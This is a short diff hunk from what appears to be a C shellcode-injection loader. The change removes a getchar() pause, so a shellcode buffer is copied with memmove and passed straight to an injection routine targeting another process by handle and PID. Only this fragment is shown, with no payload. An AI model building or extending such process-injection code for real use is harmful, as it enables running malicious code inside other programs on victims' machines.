@@ -310,8 +310,6 @@ int main()
         }
         printf("[+] Local Alloc [ %p ]\n", Alloc);
 
-        getchar();
-
         memmove(Alloc, shellcode, scSize);
 
         iCTX(hProcess, procPid, (unsigned char*)Alloc, scSize);
